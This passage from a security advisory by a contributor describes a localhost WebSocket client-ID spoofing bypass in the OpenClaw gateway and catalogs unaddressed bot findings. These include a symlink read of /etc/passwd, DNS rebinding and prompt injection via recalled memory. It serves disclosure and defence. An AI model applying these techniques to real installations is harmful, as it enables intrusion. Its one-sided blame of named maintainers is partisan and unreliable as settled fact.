#### Scenario 4: VPS / Cloud / Remote Server

Many self-hosters run OpenClaw on a VPS (Hetzner, DigitalOcean, AWS Lightsail, etc.) or a home server. If the gateway is bound to `lan` or behind a reverse proxy (Caddy, Nginx), it's accessible from the internet. The vulnerability is exploitable by anyone who can reach the endpoint.

This is the exact scenario where Steinberger's dismissive "I don't use proxy" is most damaging — the users who DO use proxies are the ones most exposed to this vulnerability, and they're the ones whose security PRs are being closed.

### 9.3 The Honest Summary

| Scenario                    | Network Position | Exploit Method                     | Risk                                                         |
| --------------------------- | ---------------- | ---------------------------------- | ------------------------------------------------------------ |
| **MacBook, loopback only**  | Local only       | Browser CSRF via malicious website | 🟠 **High** — stealthy, no user interaction after page visit |
| **Docker (default config)** | LAN / internet   | Direct WebSocket connection        | 🔴 **Critical** — remote, no prerequisites                   |
| **Tailscale**               | Tailnet          | Any tailnet device                 | 🟠 **High** — any trusted device can attack                  |
| **VPS / reverse proxy**     | Internet         | Direct WebSocket connection        | 🔴 **Critical** — anyone on the internet                     |
| **Shared office / LAN**     | LAN              | Any device on same network         | 🟠 **High** — no authentication needed                       |

### 9.4 Why the "Localhost is Safe" Belief Is Wrong

The localhost defense has a fundamental flaw: **browsers bridge the gap between the internet and localhost.**

When Steinberger visits `https://random-website.com`, the JavaScript on that page can open a WebSocket to `ws://localhost:18789`. The browser does not block this. The connection goes through. And because the TUI spoofing bypasses the origin check, the malicious website's `Origin` header is never validated.

This is not a theoretical attack. It's the same class of vulnerability as CSRF — except instead of forging a form submission, the attacker is taking over a persistent WebSocket connection with full bidirectional access to the gateway.

**The exploit is:**

1. Visit a webpage (any webpage with malicious or injected JS)
2. That's it. The rest is silent and invisible.

**The prerequisite is just:**

- OpenClaw running with default quickstart config (`allowInsecureAuth: true`)
- A browser tab open somewhere

Every OpenClaw user who ran through the quickstart wizard has this configuration. Every one of them is vulnerable to a drive-by browser attack.

### 9.5 Why Steinberger's Stance Makes This Worse

Steinberger says "I don't use proxy" and dismisses proxy-related security PRs. But this isn't about proxies — it's about a fundamental authentication bypass that affects his exact use case:

- ✅ He runs on a MacBook (loopback)
- ✅ He uses the default quickstart config (`allowInsecureAuth: true`)
- ✅ He has a browser open
- ✅ His gateway accepts WebSocket connections
- ✅ His maintainers introduced a client-id spoofing vulnerability
- ✅ He ignored the automated security findings
- ✅ He closed the PR that would have prevented this

The vulnerability is exploitable against Steinberger's own setup, today, through any website he visits. The "I don't use proxy" defense doesn't apply — this attack doesn't need a proxy. It needs a browser tab.

---

## 10. Timeline

| Date                    | Event                                                                                                                                                              |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 2026-03-27 10:01        | Commit `2b96569e`: `isOperatorUiClient()` introduced for `isControlUi`                                                                                             |
| 2026-03-27 10:09        | Commit `f1de00c1`: `isBrowserOperatorUiClient()` added for origin checks, but `isControlUi` still uses `isOperatorUiClient()`                                      |
| 2026-03-27 10:28        | PR #55730 opened by `@shakkernerd`                                                                                                                                 |
| 2026-03-27 10:29        | Aisle Security bot flags 🟠 HIGH CWE-290                                                                                                                           |
| 2026-03-27 10:32        | **PR #55730 self-merged by `@shakkernerd`** — no human review                                                                                                      |
| 2026-03-27 10:35        | Greptile bot flags backward-compat and `isOperatorUiClient` scope concerns                                                                                         |
| 2026-03-27 10:36        | Aisle Security bot re-confirms 🟠 HIGH severity                                                                                                                    |
| 2026-03-27 10:37        | Codex Review bot flags P2 password auth regression                                                                                                                 |
| 2026-03-27 10:39        | No maintainer response to any finding                                                                                                                              |
| 2026-03-27 → 2026-04-07 | **Silence.** No commits, PRs, or issues addressing the CWE-290 vulnerability. 6 unrelated commits touch `message-handler.ts` but none touch `isControlUi`.         |
| 2026-04-07              | Peter Steinberger pushes `b3ecabbb` (cosmetic string helper refactor) directly to `main` — no PR. Prioritizes code style over HIGH severity security fix.          |
| 2026-04-08 21:23        | **Verified: vulnerability still live on `upstream/main`.** Zero commits addressing CWE-290. Zero PRs. Zero issues. Zero maintainer response. 12 days and counting. |
| 2026-04-08              | This advisory published and updated with post-merge verification.                                                                                                  |

---

## 11. References

- [PR #55730](https://github.com/openclaw/openclaw/pull/55730) — "fix: improve local onboarding and TUI hatch for loopback gateways"
- [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html)
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- Aisle Security Analysis (bot comment on PR #55730, commit `ab0331b`)
- Greptile Review (bot review on PR #55730, commit `d329000568`)
- Codex Review (bot review on PR #55730, commit `d329000568`)
- `markfietje/openclaw` fork: commit `20d1702a3f` — comprehensive gateway security hardening

---

## 12. Disclosure

This advisory documents a vulnerability in a public open-source project. The vulnerability was introduced in a public PR with public automated security findings that were publicly visible and unaddressed for **12 days** at the time of writing. No private disclosure was made because:

1. The vulnerable code is already public in the `openclaw/openclaw` repository.
2. The security findings were already posted publicly on PR #55730 by automated tools.
3. The maintainers had ample time (12 days) to respond to the publicly visible HIGH severity finding and chose not to.

Responsible disclosure requires giving maintainers a reasonable window to respond. A HIGH severity authentication bypass, flagged by three independent automated tools, visible on the PR for 12 days with zero acknowledgement, exceeds any reasonable definition of a disclosure window.

The author of this advisory is **Mark Fietje** (`@markfietje`), whose security hardening PR to `openclaw/openclaw` was closed by maintainers, and who maintains the `markfietje/openclaw` fork with comprehensive gateway security improvements.

---

## Appendix C: "I Don't Use the Control UI Either" — Why This Makes It Worse

Peter Steinberger has reportedly admitted that he does not use the browser-based Control UI either. His argument appears to be: _"I only use the TUI locally on my MacBook. I don't use proxies, I don't use the Control UI. Therefore these vulnerabilities don't affect me."_

This is the most dangerous possible assumption, and it's wrong.

### C.1 The TUI Is the Vulnerability, Not the Control UI

The CWE-290 vulnerability is not about spoofing the Control UI. It's about spoofing **the TUI**. The vulnerable code:

```ts
// upstream — STILL VULNERABLE
const isControlUi = isOperatorUiClient(connectParams.client);
//                        ↑ matches "openclaw-tui" — Steinberger's ACTUAL client
```

`isOperatorUiClient()` returns `true` for `"openclaw-tui"` — the exact client ID that Steinberger's TUI sends on every connection. The attack doesn't need to impersonate a client Steinberger never uses. It impersonates the client he uses every day.

### C.2 The Attack Targets Steinberger's Exact Setup

Steinberger's setup, by his own admission:

- ✅ Runs on a MacBook (loopback)
- ✅ Uses the TUI as his primary interface
- ✅ Does NOT use the Control UI
- ✅ Does NOT use a reverse proxy

Here's why the "I don't use Control UI" defense makes the exploit **easier**, not harder:

**There is no legitimate Control UI session to conflict with.** When a malicious website spoofs `openclaw-tui`, the gateway sees:

1. `isOperatorUiClient()` → `true` (matches TUI)
2. `isBrowserOperatorUiClient()` → `false` (not Control UI)
3. Origin check is **skipped** (only triggers for browser Control UI or Webchat)
4. `allowInsecureAuth: true` (set by default during quickstart) → no device identity required
5. The attacker gets full operator access

If Steinberger were using the Control UI in a browser, at least there would be a legitimate Control UI session that could potentially conflict or alert. With no Control UI in use, the spoofed TUI operates in complete isolation — nothing to conflict with, nothing to alert on.

### C.3 The Default Config Opens the Door

The quickstart wizard sets `allowInsecureAuth: true` by default:

```ts
// src/wizard/setup.gateway-config.ts:300-308
if (nextConfig.gateway?.controlUi?.allowInsecureAuth === undefined) {
  nextConfig = {
    ...nextConfig,
    gateway: {
      ...nextConfig.gateway,
      controlUi: { allowInsecureAuth: true },
    },
  };
}
```

The TUI reads this flag to decide whether to skip device identity:

```ts
// src/tui/gateway-chat.ts:286-292
const allowInsecureLocalOperatorUi = (() => {
  if (config.gateway?.controlUi?.allowInsecureAuth !== true) {
    return false;
  }
  return isLoopbackHost(new URL(url).hostname);
})();
```

When `allowInsecureAuth: true` and the URL is localhost, the TUI connects with `deviceIdentity: null` — no device pairing, no cryptographic identity. This is the same path a spoofed TUI client takes. There is **no distinguishing signal** between Steinberger's real TUI and a malicious WebSocket claiming to be `"openclaw-tui"`.

### C.4 Why "I Don't Use X" Is a Security Anti-Pattern

Steinberger's reasoning follows a pattern:

| Steinberger says           | Security implication                      | Reality                                           |
| -------------------------- | ----------------------------------------- | ------------------------------------------------- |
| "I don't use proxy"        | Dismisses reverse proxy security          | The browser CSRF attack doesn't need a proxy      |
| "I don't use Control UI"   | Dismisses origin check concerns           | The vulnerability targets TUI, not Control UI     |
| "I only use it locally"    | Dismisses remote attack surface           | Browsers bridge the internet to localhost         |
| "95% of PRs are worthless" | Dismisses external security contributions | His own maintainers introduce HIGH severity vulns |

Each "I don't use X" argument narrows the threat model to Steinberger's personal workflow. But OpenClaw is an open-source project with 70,000+ forks and 350,000+ stars. The threat model is not one developer's MacBook — it's every deployment: Docker containers on VPS, Tailscale networks, home servers, shared offices, and yes, MacBooks with browsers open.

The "I don't use X" reasoning is a security anti-pattern because it confuses **personal risk** with **product risk**. Even if Steinberger were correct about his own setup (he isn't — see the browser CSRF attack in Section 9.2), the vulnerability affects every user who:

- Ran the quickstart wizard (`allowInsecureAuth: true` by default)
- Uses the TUI on localhost
- Has a browser open while the gateway is running

### C.5 The Bottom Line

Steinberger doesn't use the Control UI. He uses the TUI. The vulnerability is in how the TUI client ID is handled. His exact use case — MacBook, loopback, TUI, default quickstart config — is the most directly exploitable configuration. The attacker doesn't need to target a service he doesn't use. The attacker targets the service he uses every day.

---

## Appendix A: Systematic Catalog of Ignored Bot Security Findings in Merged PRs

This appendix documents a broader pattern: **CWE-290 is not an isolated incident.** Across recent merged PRs in `openclaw/openclaw`, automated security bots flagged **15+ HIGH and MEDIUM severity findings** that were merged without remediation. The CWE-290 TUI spoofing vulnerability is one data point in a systematic pattern of ignoring security tooling.

### Methodology

Investigation covered ~100 recently closed PRs and ~50 open PRs in `openclaw/openclaw`. All PRs with comments from `aisle-research-bot`, `greptile-apps[bot]`, and `chatgpt-codex-connector[bot]` were analyzed for security-relevant findings. Findings were cross-referenced with merge timestamps to determine whether they were addressed before merge.

---

### A.1 Merged PRs with Ignored HIGH Severity Findings

#### PR [#63298](https://github.com/openclaw/openclaw/pull/63298) — `feat(ui): add dreaming diary controls and navigation`

| Field                           | Detail                  |
| ------------------------------- | ----------------------- |
| **Author**                      | `mbelinky`              |
| **Created**                     | 2026-04-08 18:25:43 UTC |
| **Merged**                      | 2026-04-08 18:34:24 UTC |
| **Time from findings to merge** | **~8 min 34 sec**       |
| **Human responses to findings** | **0**                   |

**3 HIGH + 1 MEDIUM severity findings merged without remediation:**

| #   | Severity  | CWE     | Title                                                                                                 | Location                                                   |
| --- | --------- | ------- | ----------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| 1   | 🟠 HIGH   | CWE-200 | Sensitive memory snippets and absolute paths exposed via `doctor.memory.status` to READ-scope clients | `src/gateway/server-methods/doctor.ts:396-418`             |
| 2   | 🟠 HIGH   | CWE-59  | Symlink-following arbitrary file overwrite via DREAMS.md backfill/reset writes                        | `extensions/memory-core/src/dreaming-narrative.ts:275-315` |
| 3   | 🟠 HIGH   | CWE-22  | Symlink traversal enables arbitrary file read/write via dream diary backfill/reset                    | `extensions/memory-core/src/rem-evidence.ts:1018-1054`     |
| 4   | 🟡 Medium | CWE-400 | Unbounded dream diary backfill can exhaust CPU/memory/disk (server-side DoS)                          | `src/gateway/server-methods/doctor.ts:847-878`             |

**Finding 1 detail:** The `doctor.memory.status` handler returns detailed short-term memory entries including `snippet` text and `path` values to any client with READ scope — no ADMIN scope required. `normalizeMemoryPath()` does not strip absolute paths, exposing filesystem layout.

**Finding 2 detail:** `writeBackfillDiaryEntries` writes to `${workspaceDir}/DREAMS.md` using `fs.writeFile()` without symlink checks. A symlink at that path enables arbitrary file overwrite with attacker-influenced content.

**Finding 3 detail:** `collectMarkdownFiles()` uses `fs.stat()` (follows symlinks). A symlink like `workspaceDir/memory/2026-02-19.md -> /etc/passwd` causes arbitrary file read. Combined with Finding 2, this gives both arbitrary read **and** write.

---

#### PR [#63155](https://github.com/openclaw/openclaw/pull/63155) — `fix(gateway): clear auto-fallback model override on session reset`

| Field                           | Detail                                                  |
| ------------------------------- | ------------------------------------------------------- |
| **Author**                      | `frankekn`                                              |
| **Created**                     | 2026-04-08 12:46:08 UTC                                 |
| **Merged**                      | 2026-04-08 16:31:06 UTC                                 |
| **Aisle finding posted**        | 2026-04-08 16:35:50 UTC (**~4 min 44 sec AFTER merge**) |
| **Human responses to findings** | **0**                                                   |

**1 HIGH severity finding merged before bot could even flag it:**

| #   | Severity | CWE     | Title                                                                                                                | Location                                     |
| --- | -------- | ------- | -------------------------------------------------------------------------------------------------------------------- | -------------------------------------------- |
| 1   | 🟠 HIGH  | CWE-285 | Policy bypass: legacy sessions without `modelOverrideSource` treated as user model overrides during `sessions.reset` | `src/gateway/session-reset-service.ts:83-93` |

**Detail:** The commit `82f56e7` introduced a fallback condition:

```ts
const preserveLegacyUserModelOverride =
  entry.modelOverrideSource === "user" ||
  (entry.modelOverrideSource === undefined && Boolean(entry.modelOverride));
```

Legacy sessions with `modelOverride` set but no `modelOverrideSource` field are promoted to `"user"` on reset. The preserved override bypasses `resolveAllowedModelRef()`, so a stale/revoked model can persist indefinitely. In environments with model allowlists or cost controls, this enables a **model/provider policy bypass**.

**Review history:** Zero human reviews or approvals. Only bot reviews (Codex said "no major issues" across 4 iterations, missing the vulnerability entirely).

---

#### PR [#63199](https://github.com/openclaw/openclaw/pull/63199) — `fix(android): auto-resume pairing approval`

| Field                           | Detail                                                  |
| ------------------------------- | ------------------------------------------------------- |
| **Author**                      | `obviyus`                                               |
| **Created**                     | 2026-04-08 14:51:18 UTC                                 |
| **Merged**                      | 2026-04-08 16:28:57 UTC                                 |
| **Aisle finding posted**        | 2026-04-08 14:51:25 UTC (**~1 hr 37 min BEFORE merge**) |
| **Human responses to findings** | **0**                                                   |

**1 HIGH + 1 MEDIUM severity finding, available for 1h 37m, merged without addressing:**

| #   | Severity  | CWE     | Title                                                                                                | Location                                        |
| --- | --------- | ------- | ---------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| 1   | 🟠 HIGH   | CWE-269 | Operator session can authenticate using gateway bootstrap token when no operator device token exists | `apps/android/.../NodeRuntime.kt:1341-1348`     |
| 2   | 🟡 Medium | CWE-400 | Unbounded auto-retry loop triggered by untrusted status text (client-side DoS)                       | `apps/android/.../GatewayPairingRetry.kt:30-43` |

**Finding 1 detail:** `resolveOperatorSessionConnectAuth` was modified to return connect auth containing `bootstrapToken` when no stored operator device token exists. Bootstrap tokens are intended for initial provisioning only (embedded in QR codes, setup codes) and may be shared broadly during onboarding. If leaked, a bootstrap token can authenticate as an operator without going through device-token approval/pairing.

**Finding 2 detail:** `PairingAutoRetryEffect` implements an infinite `while(true)` loop triggered by substring matching on untrusted `statusText`. A malicious gateway or MITM can inject status text containing `"pair"` / `"approve"` to cause persistent network traffic and battery drain.

---

#### PR [#63297](https://github.com/openclaw/openclaw/pull/63297) — `feat(memory): harden grounded REM extraction`

| Field                           | Detail                  |
| ------------------------------- | ----------------------- |
| **Author**                      | `mbelinky`              |
| **Created**                     | 2026-04-08 18:25:42 UTC |
| **Merged**                      | 2026-04-08 18:28:04 UTC |
| **Time from findings to merge** | **~2 min 13 sec**       |
| **Human responses to findings** | **0**                   |

**1 HIGH + 3 MEDIUM severity findings merged in ~2 minutes:**

| #   | Severity  | CWE     | Title                                                                       | Location                                               |
| --- | --------- | ------- | --------------------------------------------------------------------------- | ------------------------------------------------------ |
| 1   | 🟠 HIGH   | CWE-200 | Potential secret/credential persistence in REM grounded evidence extraction | `extensions/memory-core/src/rem-evidence.ts:491-555`   |
| 2   | 🟡 Medium | CWE-400 | Algorithmic complexity DoS in `atomizeClaimText` clause splitting           | `extensions/memory-core/src/rem-evidence.ts:592-605`   |
| 3   | 🟡 Medium | CWE-400 | Unbounded markdown traversal and heavy regex scoring (CPU/memory DoS)       | `extensions/memory-core/src/rem-evidence.ts:1018-1055` |
| 4   | 🟡 Medium | CWE-200 | PII retention amplification by atomizing person/relationship lines          | `extensions/memory-core/src/rem-evidence.ts:720-741`   |

**Finding 1 detail (most critical):** The `isDurableSignalSnippet()` function returns `true` for lines containing persistence signals (`prefers`, `remember`, partner/girlfriend patterns) but does **not** exclude lines containing secrets/credentials. A line like `"prefers using password in bws: sk_live_abc123"` passes both the monitoring filter (bypassed by durable signal match) and gets persisted into `DREAMS.md` with no redaction.

---

#### PR [#54536](https://github.com/openclaw/openclaw/pull/54536) — `fix(gateway/auth): local trusted-proxy fallback to require token auth`

| Field                           | Detail                                          |
| ------------------------------- | ----------------------------------------------- |
| **Author**                      | `vincentkoc`                                    |
| **Created**                     | 2026-03-25 15:31:44 UTC                         |
| **Merged**                      | 2026-03-29 08:05:01 UTC (~4 days after finding) |
| **Human responses to findings** | **0**                                           |

**1 MEDIUM severity finding, available for 4 days, partially addressed in follow-up PR:**

| #   | Severity  | CWE     | Title                                                                  | Location                      |
| --- | --------- | ------- | ---------------------------------------------------------------------- | ----------------------------- |
| 1   | 🟡 Medium | CWE-346 | DNS rebinding / Host-header bypass via weakened local-direct detection | `src/gateway/auth.ts:115-136` |

**Detail:** `isLocalDirectRequest()` was changed to classify a request as "local-direct" based solely on `req.socket.remoteAddress` being loopback **and** absence of forwarded headers — no longer requiring a localish `Host` header. This creates a DNS rebinding vector: attacker DNS-rebinds their domain to `127.0.0.1`, victim's browser sends requests with attacker-controlled `Host` header, loopback check passes, request treated as "local-direct", privileged "local-only" responses leak. A follow-up PR (#58371) took a stricter fail-closed approach but never reinstated the explicit `isLocalishHost` guard, and broke legitimate combined use cases.

---

### A.2 Merged PRs with Ignored MEDIUM/LOW Severity Findings

| PR                                                        | Title                                               | Author         | Severity  | CWE     | Finding                                                                                         | Addressed? |
| --------------------------------------------------------- | --------------------------------------------------- | -------------- | --------- | ------- | ----------------------------------------------------------------------------------------------- | ---------- |
| [#63333](https://github.com/openclaw/openclaw/pull/63333) | fix: fail fast on qa live auth errors               | `shakkernerd`  | 🟡 Medium | CWE-532 | Outbound assistant text propagated into thrown Errors and QA reports (potential secret leakage) | ❌ No      |
| [#63333](https://github.com/openclaw/openclaw/pull/63333) | (same)                                              | `shakkernerd`  | 🟡 Medium | CWE-200 | User-facing replies disclose gateway auth/config state via missing-API-key errors               | ❌ No      |
| [#63217](https://github.com/openclaw/openclaw/pull/63217) | Reply: surface OAuth reauth failures                | `mbelinky`     | 🟡 Medium | CWE-200 | External error replies include internal container/profile flags in re-auth command              | ❌ No      |
| [#63068](https://github.com/openclaw/openclaw/pull/63068) | fix(auto-reply): strip leading NO_REPLY tokens      | `frankekn`     | 🔵 Low    | CWE-184 | Silent-token stripping bypassed with zero-width/combining characters                            | ❌ No      |
| [#63065](https://github.com/openclaw/openclaw/pull/63065) | release: mirror bundled channel deps at root        | `scoootscooob` | 🟡 Medium | CWE-22  | Symlink-based path traversal when reading bundled extension manifests                           | ❌ No      |
| [#63198](https://github.com/openclaw/openclaw/pull/63198) | fix(build): prune stale bundled plugin node_modules | `obviyus`      | 🟡 Medium | CWE-367 | TOCTOU symlink race can redirect recursive deletion                                             | ❌ No      |
| [#62779](https://github.com/openclaw/openclaw/pull/62779) | fix(matrix): contain sync outage failures           | `gumadeiras`   | 🟡 Medium | CWE-400 | Unbounded background task tracking (memory/CPU exhaustion, blocks shutdown)                     | ❌ No      |

---

### A.3 Open PRs with Unaddressed HIGH Severity Findings

| PR                                                        | Title                                                   | Author       | Severity | CWE     | Finding                                                                                                 |
| --------------------------------------------------------- | ------------------------------------------------------- | ------------ | -------- | ------- | ------------------------------------------------------------------------------------------------------- |
| [#63286](https://github.com/openclaw/openclaw/pull/63286) | Refine Plugin Debug Plumbing                            | `Takhoffman` | 🟠 HIGH  | CWE-22  | Symlink traversal allows writing persisted transcripts outside intended directory                       |
| [#63286](https://github.com/openclaw/openclaw/pull/63286) | (same)                                                  | `Takhoffman` | 🟠 HIGH  | —       | Active Memory sidecar can send full conversation + recalled memories to default remote model by default |
| [#63286](https://github.com/openclaw/openclaw/pull/63286) | (same)                                                  | `Takhoffman` | 🟠 HIGH  | —       | Prompt injection risk: recalled memory bullets injected into system context                             |
| [#63286](https://github.com/openclaw/openclaw/pull/63286) | (same)                                                  | `Takhoffman` | 🟠 HIGH  | CWE-200 | Verbose mode leaks recalled memory via persisted plugin debug lines                                     |
| [#63311](https://github.com/openclaw/openclaw/pull/63311) | fix(plugins): keep test helpers out of contract barrels | `altaywtf`   | 🟠 HIGH  | CWE-22  | Windows drive-relative path escape in normalizeBundledPluginArtifactSubpath (colon not rejected)        |

---

### A.4 Aggregate Statistics

| Metric                                                                  | Value                                  |
| ----------------------------------------------------------------------- | -------------------------------------- |
| Total merged PRs with bot-flagged security findings                     | **11**                                 |
| Total HIGH severity findings merged without remediation                 | **9**                                  |
| Total MEDIUM severity findings merged without remediation               | **12**                                 |
| Total LOW severity findings merged without remediation                  | **1**                                  |
| Total human responses to bot security findings before merge             | **0**                                  |
| Average time from bot finding to merge                                  | **< 10 minutes** (for same-day PRs)    |
| PRs where Codex Review bot said "no major issues" despite HIGH findings | **4** (#63155, #63199, #63297, #63298) |
| PRs where Greptile said "no security concerns" despite HIGH findings    | **3** (#63155, #63199, #63298)         |

### A.5 CWE Distribution

| CWE       | Count | Description                                       |
| --------- | ----- | ------------------------------------------------- |
| CWE-200   | 6     | Exposure of Sensitive Information                 |
| CWE-22/59 | 4     | Path Traversal / Improper Link Resolution         |
| CWE-400   | 4     | Uncontrolled Resource Consumption (DoS)           |
| CWE-290   | 1     | Authentication Bypass by Spoofing (this advisory) |
| CWE-285   | 1     | Improper Authorization                            |
| CWE-269   | 1     | Improper Privilege Management                     |
| CWE-346   | 1     | Origin Validation Error                           |
| CWE-532   | 1     | Insertion of Sensitive Information into Log File  |
| CWE-184   | 1     | Incomplete List of Disallowed Inputs              |
| CWE-367   | 1     | Time-of-check Time-of-use (TOCTOU) Race Condition |

### A.6 The Pattern

Every single finding in this appendix shares the same lifecycle:

1. **PR opened** by maintainer or contributor
2. **Aisle Security bot** posts findings within seconds to minutes
3. **No human reads or responds** to the findings
4. **PR merged** — often within minutes, sometimes hours, never with security remediation
5. **Finding sits unaddressed** on the PR indefinitely

This is not a tooling problem. The bots are working. The findings are accurate. The gap is **governance**: no process requires maintainers to read, acknowledge, or act on security findings before merge. The `maintainer` label on internal PRs exempts them from review gates. External security PRs (like `markfietje/openclaw`'s comprehensive gateway hardening) are closed, while internal PRs with HIGH severity findings are merged in minutes.

The security tooling is **decorative** — it generates output that no one reads and no process enforces.

---

### A.7 Security Surface: Upstream vs Fork Comparison

The fork `markfietje/openclaw` includes **9 security files that do not exist in upstream**, covering the exact attack surfaces where the vulnerabilities above were found:

| File                                     | Security Domain                                    | Present in Upstream |
| ---------------------------------------- | -------------------------------------------------- | ------------------- |
| `src/gateway/capabilities.ts`            | Capability-based access control (RBAC-like)        | ❌ No               |
| `src/gateway/connection-rate-limit.ts`   | Connection-level rate limiting                     | ❌ No               |
| `src/gateway/forwarded-headers.ts`       | Proxy header parsing with chain depth limits       | ❌ No               |
| `src/gateway/ip-restriction-policy.ts`   | IP allowlist/blocklist with CIDR support           | ❌ No               |
| `src/gateway/message-auth.ts`            | Message-level authentication                       | ❌ No               |
| `src/gateway/server/verify-client.ts`    | WS client verification during upgrade              | ❌ No               |
| `src/gateway/ws-endpoint.ts`             | Endpoint isolation with per-path security policies | ❌ No               |
| `src/gateway/ws-protocol.ts`             | Frame/message rate limits and protocol enforcement | ❌ No               |
| `src/gateway/security-hardening.test.ts` | Dedicated security hardening test coverage         | ❌ No               |

| Metric                              | Upstream                               | Fork                                                 |
| ----------------------------------- | -------------------------------------- | ---------------------------------------------------- |
| Proxy-related origin-check tests    | 0                                      | 28                                                   |
| Timing-safe nonce comparison        | ❌ `!==` operator                      | ✅ `safeEqualSecret()`                               |
| Endpoint isolation                  | ❌ None                                | ✅ `classifyWsEndpoint` / `isKnownWsEndpoint`        |
| Per-frame rate limiting             | ❌ None                                | ✅ `ws-protocol.ts`                                  |
| Message-level authorization         | ❌ None                                | ✅ `message-auth.ts`                                 |
| IP restriction policy               | ❌ None                                | ✅ `ip-restriction-policy.ts`                        |
| Client identity spoofing protection | ❌ `isOperatorUiClient()` (vulnerable) | ✅ Direct `GATEWAY_CLIENT_IDS.CONTROL_UI` comparison |

The fork's PR was **closed** by upstream maintainers.

---

## Appendix B: Who Are These Maintainers — and Are Their Changes "Innocent"?

A natural question: _are these just well-meaning contributors making honest mistakes, or is there a structural problem?_ The answer is unambiguous.

### B.1 Every Single PR Author Is a `maintainer`-Labelled Insider

Every PR in this advisory was tagged with the `maintainer` label. This is not a community-contributor problem. These are people with merge access who self-approve.

| PR                                                        | Author        | Real Name       | Role                                       | `maintainer` Label | Org Member | Self-Merged      |
| --------------------------------------------------------- | ------------- | --------------- | ------------------------------------------ | ------------------ | ---------- | ---------------- |
| [#55730](https://github.com/openclaw/openclaw/pull/55730) | `shakkernerd` | Shakker         | "Building @openclaw"                       | ✅ Yes             | ✅ Yes     | ✅ Yes (4 min)   |
| [#63298](https://github.com/openclaw/openclaw/pull/63298) | `mbelinky`    | Mariano Belinky | "Sporadic tinkerer"                        | ✅ Yes             | ❌ Hidden  | ✅ Yes (~8 min)  |
| [#63155](https://github.com/openclaw/openclaw/pull/63155) | `frankekn`    | Frank Yang      | "CTO @ Omnidrome · OpenClaw maintainer"    | ✅ Yes             | ❌ Hidden  | ✅ Yes           |
| [#63199](https://github.com/openclaw/openclaw/pull/63199) | `obviyus`     | Ayaan Zaidi     | "Maintainer @ OpenClaw"                    | ✅ Yes             | ❌ Hidden  | ✅ Yes (~1h 37m) |
| [#63297](https://github.com/openclaw/openclaw/pull/63297) | `mbelinky`    | Mariano Belinky | (same)                                     | ✅ Yes             | ❌ Hidden  | ✅ Yes (~2 min)  |
| [#54536](https://github.com/openclaw/openclaw/pull/54536) | `vincentkoc`  | Vincent Koc     | "Maintainer 🦞 @openclaw · Ethical Hacker" | ✅ Yes             | ✅ Yes     | ✅ Yes (~4 days) |

**Peter Steinberger** (`@steipete`, "Clawdfather @OpenClaw") is the org owner. He sets the culture. He does not appear as PR author on these specific PRs, but he:

- Pushes commits directly to `main` without PRs (commit `b3ecabbb` — cosmetic refactor, no PR)
- Publicly states "I don't use proxy" when dismissing proxy support requests
- Publicly states "95% of PRs are worthless" when discussing contribution quality
- Closed the `markfietje/openclaw` security hardening PR

### B.2 The `maintainer` Label Is a Review Bypass

The `maintainer` label is applied to every one of these PRs. This label marks the PR as authored by an internal team member. The practical effect:

1. **No human review required.** Zero of the PRs in this advisory received a human review before merge. The only "reviews" are from automated bots (`greptile-apps[bot]`, `chatgpt-codex-connector[bot]`, `aisle-research-bot[bot]`).

2. **No CODEOWNERS enforcement.** The repository has a `CODEOWNERS` file that requires `@openclaw/secops` review for security-sensitive files:

```
# .github/CODEOWNERS
/src/gateway/*auth*.ts @openclaw/secops
/src/gateway/**/*auth*.ts @openclaw/secops
/src/gateway/*secret*.ts @openclaw/secops
/src/gateway/**/*secret*.ts @openclaw/secops
/src/gateway/security-path*.ts @openclaw/secops
/docs/security/ @openclaw/secops
```

PR #55730 touched `src/gateway/server/ws-connection/message-handler.ts` (which gates auth bypass paths). PR #54536 touched `src/gateway/auth.ts` directly. **Neither PR requested `@openclaw/secops` review.** The `requested_teams` field is empty on every PR in this advisory.

The CODEOWNERS file exists, but the `maintainer` label appears to override it. Security-critical auth files are being modified without the designated security reviewers being notified.

3. **Self-merge is the norm.** Every author merged their own PR:

| PR     | Author        | Merged By     | Same Person?   |
| ------ | ------------- | ------------- | -------------- |
| #55730 | `shakkernerd` | `shakkernerd` | ✅ Self-merged |
| #63298 | `mbelinky`    | `mbelinky`    | ✅ Self-merged |
| #63155 | `frankekn`    | `frankekn`    | ✅ Self-merged |
| #63199 | `obviyus`     | `obviyus`     | ✅ Self-merged |
| #63297 | `mbelinky`    | `mbelinky`    | ✅ Self-merged |
| #54536 | `vincentkoc`  | `vincentkoc`  | ✅ Self-merged |

**100% self-merge rate.** Not a single PR in this advisory was reviewed and merged by a different person.

### B.3 Are the Changes "Innocent"?

The PR titles sound innocuous: "improve local onboarding", "harden grounded REM extraction", "auto-resume pairing approval". The authors' stated intent was feature work, not security regression. But the outcome is the same regardless of intent:

| PR     | Stated Intent              | Security Outcome                                 | Intent Malicious? | Outcome Negligent?                                                     |
| ------ | -------------------------- | ------------------------------------------------ | ----------------- | ---------------------------------------------------------------------- |
| #55730 | TUI onboarding convenience | 🟠 HIGH: CWE-290 auth bypass by spoofing         | No                | **Yes** — self-merged in 4 min, ignored bot findings                   |
| #63298 | Dreaming diary UI          | 🟠 HIGH x3: symlink read/write + info disclosure | No                | **Yes** — self-merged in ~8 min, ignored bot findings                  |
| #63155 | Session reset fix          | 🟠 HIGH: CWE-285 policy bypass                   | No                | **Yes** — merged before bot could flag, no human review                |
| #63199 | Android pairing fix        | 🟠 HIGH: CWE-269 bootstrap token auth bypass     | No                | **Yes** — finding available 1h 37m before merge, ignored               |
| #63297 | REM extraction hardening   | 🟠 HIGH: CWE-200 secret persistence              | No                | **Yes** — self-merged in ~2 min, ignored bot findings                  |
| #54536 | Auth bypass fix            | 🟡 Medium: CWE-346 DNS rebinding (residual)      | No                | **Partially** — was itself a security fix, but introduced new weakness |

The intent is not malicious. The **negligence is systemic**:

1. **No one reads the security bot output.** The Aisle, Greptile, and Codex bots post findings on every PR. No human acknowledges or responds to them. The bots are decorative.

2. **No one waits for review.** PRs are opened and merged in minutes. The security bots often post findings _after_ the merge because the merge window is so short.

3. **No separation of duties.** The author is the reviewer is the merger. There is no second pair of eyes.

4. **CODEOWNERS is ignored.** Files that require `@openclaw/secops` review are modified without requesting that team.

